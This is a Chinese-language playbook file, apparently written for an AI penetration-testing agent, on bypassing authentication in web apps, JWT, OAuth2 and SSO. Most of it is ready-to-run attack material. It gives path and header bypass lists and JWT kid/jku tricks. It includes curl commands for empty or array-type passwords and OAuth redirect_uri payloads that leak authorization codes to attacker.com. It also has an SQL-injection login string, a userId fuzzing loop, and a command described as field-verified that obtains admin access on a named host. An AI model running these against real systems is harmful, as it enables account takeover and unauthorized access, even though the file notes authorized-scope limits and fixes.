---
name: auth-bypass
domain: auth-bypass|jwt|oauth|sso
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# 未授权与鉴权绕过(Auth Bypass)

## Domain

- /admin /internal /api/v*/admin/ ; 401/403 但路由真实存在
- JWT/SSO/OAuth 出现;注册/登录异常
- 见 cn-auth 互补(短信/企微/钉钉)

## Boundaries

- 200 + 登录页 HTML = 假绕过,不报
- 200 + 仅 healthcheck 公开数据 = 不报 SRC verified
- 不爆破生产账号;弱口令仅授权范围内 + 限速
- JWT 伪造验证用测试账号,不劫持真实用户会话批量操作

## Pivot Hints

- 路径绕不过 → Header X-Original-URL / 方法 override / JWT alg
- OAuth → client_credentials / redirect_uri / code 重放
- SSO userId 置空/短串触发默认用户
- 8 大头走完无信号 → Dead End,换面

## Exit Evidence

### src
- E2: 可重放未授权访问敏感接口
- E3: 读到用户列表/配置/内部数据等业务结果
- 仅 200 无敏感 Body → phenomenon

### redteam
- E2: 进入管理面或拿到可用 token 即 hop
- 优先换 RCE/凭据面,不磨非敏感 200

## Tactics

> 原 Triggers / Coverage / Common misses / Verification 压缩如下;深度细节见文末 Reference(若有)。

## Triggers (何时用)

- 看到 `/admin` `/internal` `/backend` `/api/v*/admin/` 路径
- 请求被 401/403,但响应 Header / Body 暗示后端真实存在该路由
- JWT / SSO / OAuth Token 出现在请求中

## Coverage points (查什么)

- 路径维度绕过(尾斜杠/大小写/..;/分号截断/空白字符/版本枚举)
- Header 维度绕过(X-Original-URL / X-Rewrite-URL 反代信任头;X-Forwarded-For 伪装内网)
- HTTP 方法维度(TRACE/HEAD/PATCH;X-HTTP-Method-Override 方法重写头)
- JWT 绕过(alg:none / RS256→HS256 / kid 路径注入 / jku·x5u 外指 / 弱密钥)
- OAuth2 绕过(client_secret 提取 / userid 越权置空 / passwd 未验证 / redirect_uri / state / code 重放)
- SSO userId 回退默认用户(置空/极短字符串触发解密异常 → 回退管理员)
- 注册/登录接口异常(注册返 token / 空密码 / 数组绕过 / 验证码弱)
- 鉴权字段绕过(X-User-Id / X-Company-Uid / role / 双写参数污染)

## Common misses (AI 常忘)

- **绕过到 200 但 Body 是登录页 HTML** —— 不是真绕过,只是路由 fallback
- **绕过到内部接口但只读公开数据** —— 如 `/admin/healthcheck`,不算敏感
- **JWT alg:none 在某些库被默认禁用** —— 看 lib(jjwt 0.10+ / pyjwt 2.x 默认拒)
- **OAuth2 client_credentials 不校验** —— 拿到 client_id+secret 后先测此 grant,常返回机器 token 绕过用户鉴权
- **SSO userId 解密失败回退默认账号** —— 短字符串/纯`=`填充可能触发(详见 Reference SSO 段)

## Verification (verified 标准)

- 路径/Header/方法绕过:**200 + Body 含 admin 才算的内容**(用户列表/配置/内部数据)= 真;200 + 登录页 HTML = 误报
- JWT 绕过:改后 token 被接受且返回不同用户数据 = 真
- OAuth2:拿到他人 token / 默认用户 token = 真
- SSO:短 userId 返回 `userName` 是"管理员"/"admin"/"system" = 命中

## Related playbooks

- JS 抽路径见 `skills/js-reverse/js-deep-analysis.md`。
- JS 密钥与敏感常量提取见 `skills/js-reverse/js-deep-analysis.md`。
- JS 加密签名逆向见 `skills/js-reverse/crypto-sign.md`。
- WAF 拦了路径绕过见 `skills/fingerprint/waf-evasion.md`。
- 目标攻击面决策树见 `skills/orchestrator.md`。

## Reference (深度参考 — AI 可能不会的细节)

### 路径维度绕过速查(看到 401/403 必试)

```
/admin → /admin/  /Admin  /admin..;/  /admin..%2f  /;admin
/admin → /admin%20  /admin%09  /admin%00  (空白字符截断)
/admin → //admin  /./admin
/api/v1/admin → /api/v2/admin  /api/v0/admin  /api/v1.1/admin
```

### Header 维度绕过速查

`X-Original-URL` / `X-Rewrite-URL` 反代信任头最常爆;来源 IP 伪装(`X-Forwarded-For` / `X-Real-IP` / `X-Client-IP` / `X-Originating-IP` / `X-Remote-Addr` / `True-Client-IP` → `127.0.0.1`,后端只让内网过)。

### HTTP 方法维度

`curl -X TRACE /admin`(OPTIONS/HEAD/PATCH 任试);`X-HTTP-Method-Override: GET` 方法重写头(GET 403 但 POST 200 见过)。

### JWT 绕过(非显然变体)

| Trick | 操作 |
|---|---|
| `kid` 注入 | `kid` 是文件路径 → `../../../dev/null` 配空密钥 |
| `jku/x5u` 外指 | 改成自己控制的 URL,返回自己生成的公钥 |
| 弱密钥 | `jwt_tool` / `john` 跑 `jwt.secrets.list` |

(alg:none / RS256→HS256 AI 已知,不赘述。本地解 payload:`echo "<jwt>" | cut -d. -f2 | base64 -d`)

### OAuth2 绕过

#### 5.1 拿 `client_secret` 的四种方式

| 来源 | 方法 | 工具 |
|---|---|---|
| 前端泄露 | JS 搜 `client_secret`、`clientSecret`、`client_secret:` | `skills/js-reverse/js-deep-analysis.md` |
| 登录抓包 | 授权码流程中 `client_secret` 出现在 `/token` 请求 | Burp / 浏览器 DevTools |
| 小程序联动 | 反编译微信小程序/支付宝小程序找配置 | `unveil` / 手动反编译 |
| 弱密钥爆破 | 跑常见 secret 字典 | `ffuf` / 自定义脚本 |

拿到 `client_id` + `client_secret` 后先测 `client_credentials`：

```bash
curl -sk -X POST 'https://target.com/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=client_credentials&client_id=xxx&client_secret=yyy'
```

#### 5.2 `userid` 越权 / 置空

| 场景 | Payload | 预期 |
|---|---|---|
| 越权 | `userid=other_user_id` | 拿到他人 token |
| 置空 | `userid=` / `userid=null` / `userid=0` | 可能返回默认用户/管理员 |
| 类型混淆 | `userid[]=1` / `userid=1\|\|1=1` | 绕过数组/字符串校验 |

```bash
# password_grant 模式测置空
curl -sk -X POST 'https://target.com/oauth2/token' \
  -d 'grant_type=password&client_id=xxx&client_secret=yyy&username=admin&password='
```

#### 5.3 `passwd` 未验证

登录接口未校验密码或空密码可通过：

```bash
# 不传 password
curl -sk -X POST 'https://target.com/oauth2/token' \
  -d 'grant_type=password&username=admin'

# 传空 password
curl -sk -X POST 'https://target.com/oauth2/token' \
  -d 'grant_type=password&username=admin&password='

# 传数组/对象
curl -sk -X POST 'https://target.com/oauth2/token' \
  -d 'grant_type=password&username=admin&password[]=x'
```

#### 5.4 授权码流程绕过

| Trick | Payload | 成功信号 |
|---|---|---|
| `redirect_uri` 绕过 | `https://target.com.attacker.com/callback` | code 发到攻击者域名 |
| | `https://attacker.com?target.com/callback` | 部分解析库误判 |
| | `https://target.com/callback@attacker.com` | 用户名部分绕过 |
| | `https://target.com/callback%23@attacker.com` | 片段 + @ 绕过 |
| `state` 缺失 | 删除 state 参数 | 仍可登录 → CSRF |
| `state` 固定 | 任意固定值 `state=123` | 可预测/复用 |
| `code` 重放 | 同一个 code 多次 POST `/token` | 多次换出有效 token |

```bash
# redirect_uri 绕过测试
curl -sk 'https://target.com/oauth2/authorize?response_type=code&client_id=xxx&redirect_uri=https://target.com.attacker.com/callback&state=123'

# code 重放测试
curl -sk -X POST 'https://target.com/oauth2/token' \
  -d 'grant_type=authorization_code&client_id=xxx&client_secret=yyy&code=STOLEN_CODE&redirect_uri=https://target.com/callback'
```

#### 5.5 JWT access_token 拿到后的绕过

拿到 OAuth2 返回的 JWT 后，继续按**四、JWT 绕过**操作：

- `alg: none`
- RS256 → HS256
- `kid` 注入
- `jku/x5u` 外指

### SSO 登录 `userId` 回退默认用户绕过

#### 触发场景

- 目标存在 `/sso/login`、`/api_v1/sso/login` 或类似 SSO 登录接口。
- 前端 JS 中硬编码了 `appKey` / `appSecret`，或接口本身在 `openApis` 白名单内无需 token。
- `userId` 参数声称需要 AES/RSA 加密，但服务端解密失败时可能**回退到默认/管理员账号**。

#### 探测方法（`userId` 置空 / 极短绕过）

不要只试“正确的空加密值”，要故意给服务端喂各种异常值，观察响应差异。核心思路：**加密后置空、不加密置空、单字符/纯填充**，都可能触发后端回退默认用户。

```bash
# 基准：空加密值（若已知 AES 密钥）
curl -sk -X POST 'https://target.com/api_v1/sso/login' \
  -H 'Content-Type: application/json' \
  -d '{"ifContainAuth":true,"userId":"<empty_encrypted>","signType":1,"loginType":0}'

# 异常值 fuzz
curl -sk -X POST 'https://target.com/api_v1/sso/login' \
  -H 'Content-Type: application/json' \
  -d '{"ifContainAuth":true,"userId":"==","signType":1,"loginType":0}'

for v in '=' '==' '===' 'a' 'b' 'x' '0' 'A' 'Z' 'a=' 'a==' 'x==' 'ab' 'abc' 'aaaa' '1111' 'xx='; do
  echo "=== userId: $v ==="
  curl -sk -X POST 'https://target.com/api_v1/sso/login' \
    -H 'Content-Type: application/json' \
    -d "{\"ifContainAuth\":true,\"userId\":\"$v\",\"signType\":1,\"loginType\":0}"
done
```

#### 判定信号

| 现象 | 含义 |
|---|---|
| `userId cant not be null` / `userId is required` | 仅判空，可继续 fuzz 短字符串 |
| `userId must be encrypted` | 服务端尝试了解密，但仅对“看起来像密文的长字符串”报错 |
| 短字符串 / 纯 `=` 返回 `200` + 默认用户/管理员 | **命中漏洞**：解密失败/结果过短被 catch 后回退默认账号 |
| 返回的 `userName` 是“管理员”、“admin”、“system” | 直接拿到高权限账号 |

#### 利用公式

只要满足以下任一条件，即可尝试未授权登录：

```
userId ∈ { 单字符, 纯 '=' 填充, 单字符 + '=' }
```

示例（已实战验证）：

```bash
# GHPE SRM — 任意单字符或纯 = 均返回 ROLE_COMPANY_ADMIN
curl -sk -X POST 'https://srm.northwind.com:2004/api_v1/sso/login' \
  -H 'Content-Type: application/json' \
  -d '{"ifContainAuth":true,"userId":"==","signType":1,"loginType":0}'
```

#### 为什么有效

服务端解密逻辑大致如下：

```java
if (userId == null || userId.isEmpty()) {
    throw new BizException("userId cant not be null");
}
try {
    String plain = aesDecrypt(base64Decode(userId));
    if (plain == null || plain.length() <= 1) {
        // 异常分支被吞掉，返回默认管理员
        return defaultAdminSession();
    }
    user = userService.findByUserId(plain);
} catch (Exception e) {
    // 解密异常也被吞掉
    return defaultAdminSession();
}
```

#### 修复建议

1. SSO 登录接口必须服务端校验 `appKey` / `appSecret` 与签名，不能仅凭请求格式通过。
2. 解密失败或 userId 无效时**直接拒绝**，不允许回退到任何默认账号。
3. 移除 `openApis` 中对 `/sso/login` 的免 token 白名单。

#### 关联

- 前端硬编码凭据提取见 `skills/js-reverse/js-deep-analysis.md`
- SSO 路由与参数分析见 `skills/js-reverse/js-deep-analysis.md`

### 注册 / 登录接口异常利用

#### 7.1 注册接口直接返回 token

有些系统注册成功后直接把 session/token 塞响应里，前端用它自动登录。

```bash
# 正常注册
curl -sk -X POST 'https://target.com/api/v1/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"attacker123","mobile":"13800138000"}'

# 看响应里有没有 access_token / sessionId / userId + 可登录凭证
```

**成功信号：** 响应包含 `access_token`、`token`、`sessionId`、`sign` 等可直接登录的字段。

#### 7.2 登录接口绕过密码

| 场景 | Payload | 预期 |
|---|---|---|
| 密码为空 | `password=` / `password=null` | 直接登录 |
| 不传密码 | 删除 password 字段 | 直接登录 |
| 密码类型混淆 | `password[]=x`、`password[0]=x` | 绕过字符串校验 |
| 万能密码 | `password=' OR '1'='1` | SQL 注入登录 |
| 手机号验证码登录 | `code=000000`、`code=123456` | 弱验证码/无次数限制 |

```bash
# 空密码
curl -sk -X POST 'https://target.com/api/v1/login' \
  -d 'username=admin&password='

# 数组绕过
curl -sk -X POST 'https://target.com/api/v1/login' \
  -d 'username=admin&password[]=x'
```

#### 7.3 可获取 token 的开放接口

重点测这些路径是否未授权或可操控：

```
/api/v1/token
/api/v1/login
/api/v1/sso/login
/api/v1/oauth2/token
/api/v1/refresh_token
/api/v1/auth/refresh
/api/v1/corp/register
/api/v1/corp/register/user
```

如果接口在 `openApis` 白名单里，先无 token 调，再看参数是否可控。

### 鉴权字段绕过

#### 8.1 请求头维度

| 字段 | 用途 | 尝试值 |
|---|---|---|
| `Authorization` | Bearer token | `Bearer `、`Bearer null`、`Bearer admin` |
| `access_token` | 部分系统放 header | `1`、`null`、`admin` |
| `X-User-Id` / `X-UserID` | 用户身份标识 | 其他用户 ID、空 |
| `X-Company-Uid` / `companyUid` | 企业/租户标识 | 其他企业 ID |
| `role` / `roleId` | 角色标识 | `admin`、`ROLE_ADMIN`、`1` |
| `Cookie: session=xxx` | session 替换 | 删除、固定值、枚举 |

```bash
curl -sk 'https://target.com/api/v1/admin/users' \
  -H 'Authorization: Bearer ' \
  -H 'X-User-Id: admin' \
  -H 'X-Company-Uid: 4025411733204e7384233bf85e5e17d8'
```

#### 8.2 Query / Body 维度

| 字段 | 场景 |
|---|---|
| `?access_token=` | 部分系统从 query 读 token |
| `?userId=` / `?companyUid=` | 直接改身份标识 |
| `?_app_id=` / `?app_id=` | 切换应用到测试/管理租户 |
| body 里加 `access_token`、`userId` | 干扰服务端解析顺序 |

#### 8.3 双写/参数污染

```bash
# 参数污染
curl -sk 'https://target.com/api/v1/users?userId=admin&userId=guest'

# 同时传 query 和 body
curl -sk -X POST 'https://target.com/api/v1/login?username=admin' \
  -d 'username=guest&password=xxx'
```

